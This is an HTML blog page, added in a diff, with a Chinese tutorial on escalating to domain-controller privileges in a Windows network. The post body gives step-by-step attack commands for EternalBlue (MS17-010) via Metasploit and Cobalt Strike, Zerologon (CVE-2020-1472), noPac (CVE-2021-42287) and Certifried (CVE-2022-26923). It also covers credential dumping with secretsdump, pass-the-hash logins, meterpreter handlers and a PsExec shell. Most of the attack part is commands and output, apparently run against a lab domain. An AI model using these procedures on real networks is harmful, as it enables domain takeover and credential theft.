@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      内网横向移动(六)-域控提权 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">F4tty</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网横向移动(六)-域控提权</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-10-11 00:00:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                    <b>#</b> 内网安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="内网横向移动-六-域控提权"><a href="#内网横向移动-六-域控提权" class="headerlink" title="内网横向移动(六)-域控提权"></a>内网横向移动(六)-域控提权</h1><h2 id="CVE-2017-0146-MS17010"><a href="#CVE-2017-0146-MS17010" class="headerlink" title="CVE-2017-0146(MS17010)"></a>CVE-2017-0146(MS17010)</h2><p>影响范围:Windows 7 8.1 10; Windows Server 2008 2012 2016;<br>-插件检测-横向移动<br>-CS联动MSF-检测&amp;利用<br>1、CS上线webserver	<br><img src="/posts/661c6a19/1665370492979-a0b46cbf-0e9d-40c5-824e-c32aafdb9066.png" alt="image.png"><br>2、CS执行联动MSF<br>CS创建监听器<br><img src="/posts/661c6a19/1665370611881-b8fd5987-6d50-45b3-997e-f47d1a9c36d3.png" alt="image.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上线主机会话交互执行</span></span><br><span class="line">spawn msf #msf为监听器名称</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665370924573-13f3297f-9850-4b08-a111-d1c8f6486761.png" alt="image.png"><br>3、MSF监听联动配置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 8888</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665370907262-9051a68a-7c14-4226-8a25-19474ff502c0.png" alt="image.png"><br>4、添加路由</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p #查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute #添加当前路由表</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665371049828-164494b0-5c2b-46b5-ae59-26b7d393579b.png" alt="image.png"><br>5、检测模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhosts 192.168.3.21-32 #设置扫描目标段</span><br><span class="line">set threads 5 #设置扫描线程数</span><br><span class="line">run </span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665371240263-f542821a-9e04-48b8-b4f6-882818f242ae.png" alt="image.png"><br>绿色加号的主机存在漏洞<br>6、利用模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp #主机不出网使用正向连接上线</span><br><span class="line">set rhost 192.168.3.25 #设置连接目标</span><br><span class="line">set rhosts 192.168.3.25 #设置扫描目标</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665375274584-2e95fa71-a317-4ad7-a95b-00fb0ed63221.png" alt="image.png"><br>攻击其他主机方法相同</p>
+<h2 id="CVE-2014-6324"><a href="#CVE-2014-6324" class="headerlink" title="CVE-2014-6324"></a>CVE-2014-6324</h2><p>见前面PTT横向移动</p>
+<h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><p>影响范围:</p>
+<blockquote>
+<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>Windows Server 2012<br>Windows Server 2012 (Server Core installation)<br>Windows Server 2012 R2<br>Windows Server 2012 R2 (Server Core installation)<br>Windows Server 2016<br>Windows Server 2016 (Server Core installation)<br>Windows Server 2019<br>Windows Server 2019 (Server Core installation)<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)<br>Windows Server, version 2004 (Server Core installation)</p>
+</blockquote>
+<p>0、获取计算机名：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665410932146-aec216ae-ba22-4aef-8fd3-02a07f52908c.png" alt="image.png"><br>添加host<br><img src="/posts/661c6a19/1665411114084-78c3546e-ea6d-4a92-b373-9fc8752def79.png" alt="image.png"><br>注意配置kali的代理<br>1、连接DC清空凭证：<br><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665411325270-6aa26f11-c05b-4f24-b688-593d98d2b36c.png" alt="image.png"><br>2、获取域内HASH:<br><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python secretsdump.py OWA2010CN-GOD\$@192.168.3.21 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665411717328-d779ca0f-1553-4f03-8466-86710aaee7ce.png" alt="image.png"><br>3、连接域控PTH：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665411760149-ab46a38e-eacd-45fe-b67b-0b1ace8b331c.png" alt="image.png"><br>4、后续恢复密码：<br>如果不恢复密码会对域环境造成严重破坏<br><a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p>
+<h2 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h2><p>前提条件：一个域内普通账号<br>影响版本：Windows基本全系列<br>前置：<br>1、开启代理：<br>利用proxifier开启代理<br>修改Host绑定域名和IP<br><img src="/posts/661c6a19/1665376677804-150d4126-2d33-405c-b0fd-60c41a75b54c.png" alt="image.png"><br>2、扫描探针：<br><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noPac scan -domain god.org -user webadmin -pass admin!@#45</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665376712725-cda647f9-2365-4b5d-8203-c674bb6fde01.png" alt="image.png"><br>存在漏洞<br>3、利用连接：<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noPac -domain god.org -user webadmin -pass admin!@#45 /dc owa2010cn-god.god.org /mAccount dadd /mPassword sdadasdsa /service cifs /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665376940217-cf958f35-2aad-4577-b5f8-40a04188be03.png" alt="image.png"><br>成功与域控建立连接<br><img src="/posts/661c6a19/1665377154177-2a5c2fa7-c7f0-4ed0-9d2e-6d3150bd9ec5.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\owa2010cn-god.god.org cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>返回cmd会话后利用下载命令像webserver下载木马<br>python一键利用<br><a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sam_the_admin.py &quot;god.org/webadmin:admin!@#45&quot; -dc-ip 192.168.3.21 -shell</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h2><p>当Windows系统的Active Directory证书服务（CS）在域上运行时，由于机器账号中的dNSHostName属性不具有唯一性，域中普通用户可以将其更改为高权限的域控机器账号属性，然后从Active Directory证书服务中获取域控机器账户的证书，导致域中普通用户权限提升为域管理员权限。<br>影响：Win8.1、Win10、Win11、WinServer2012R2、WinServer2016、WinServer2019、WinServer2022等版本<br>前提条件：<br>1、一个域内普通账号<br>2、域内存在证书服务器<br>Kali添加访问域内信息 &#x2F;etc&#x2F;hosts<br>192.168.1.15 xiaodi.local<br>192.168.1.15 xiaodi-WIN-3C7SS32SQ6R-CA<br>192.168.1.15 WIN-3C7SS32SQ6R.xiaodi.local<br>获取CA结构名和计算机名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -config - -ping</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665407139248-514782cd-747f-4a74-bc31-8dd6d4553d88.png" alt="image.png"><br>域内信息<br>地址:192.168.118.147<br>CA机构：xiaodi-WIN-3C7SS32SQ6R-CA<br>计算机:WIN-3C7SS32SQ6R.xiaodi.local<br>利用前要再kali添加host</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665410030191-61191811-72b9-42fc-a9f0-757873e996c5.png" alt="image.png"><br>利用步骤<br><a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a><br>以下命令为3.0版本命令<br>1、申请低权限用户证书</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req &#x27;xiaodi.local/test:Pass123@WIN-3C7SS32SQ6R.xiaodi.local&#x27; -ca xiaodi-WIN-3C7SS32SQ6R-CA -template User -debug</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665408920594-f809681c-5a98-4a04-b052-f5f49974d49e.png" alt="image.png"><br>2、检测证书</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx test.pfx</span><br></pre></td></tr></table></figure>
+
+<p>3、创建一个机器账户：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bloodyAD.py -d xiaodi.local -u test -p &#x27;Pass123&#x27; --host 192.168.118.147 addComputer pwnmachine &#x27;CVEPassword1234*&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665409250623-f8858f7e-e7dd-485b-b893-54fa882469d3.png" alt="image.png"><br>4、设置机器账户属性(dNSHostName和DC一致)：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bloodyAD.py -d xiaodi.local -u test -p &#x27;Pass123&#x27; --host 192.168.118.147 setAttribute &#x27;CN=pwnmachine,CN=Computers,DC=xiaodi,DC=local&#x27; dNSHostName &#x27;[&quot;WIN-3C7SS32SQ6R.xiaodi.local&quot;]&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665409431279-49db4a3f-04c2-4707-87e0-be1c3857f3f6.png" alt="image.png"><br>5、再次申请证书：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req &#x27;xiaodi.local/pwnmachine$:CVEPassword1234*@192.168.118.147&#x27; -template Machine -dc-ip 192.168.1.15 -ca xiaodi-WIN-3C7SS32SQ6R-CA</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/661c6a19/1665409421547-ec463f04-704e-476f-a4cd-3a81106be586.png" alt="image.png"><br>6、检测证书：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx ./win-3c7ss32sq6r.pfx -dc-ip 192.168.118.147</span><br></pre></td></tr></table></figure>
+
+<p>记录返回的hash<br>7、导出HASH：<br><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py &#x27;xiaodi.local/win-3c7ss32sq6r$@WIN-3C7SS32SQ6R.xiaodi.local&#x27; -hashes :10e02bef2258ad9b239e2281a01827a4</span><br></pre></td></tr></table></figure>
+
+<p>8、利用HASH：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py xiaodi.local/administrator@192.168.1.15 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</span><br></pre></td></tr></table></figure>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/fbfafbfe/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-10-11 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                        <b>#</b> 内网安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E5%85%AD-%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83"><span class="toc-text">内网横向移动(六)-域控提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-0146-MS17010"><span class="toc-text">CVE-2017-0146(MS17010)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2014-6324"><span class="toc-text">CVE-2014-6324</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-1472"><span class="toc-text">CVE-2020-1472</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-42287"><span class="toc-text">CVE-2021-42287</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-26923"><span class="toc-text">CVE-2022-26923</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E5%85%AD)-%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83 + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2F661c6a19%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/661c6a19/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
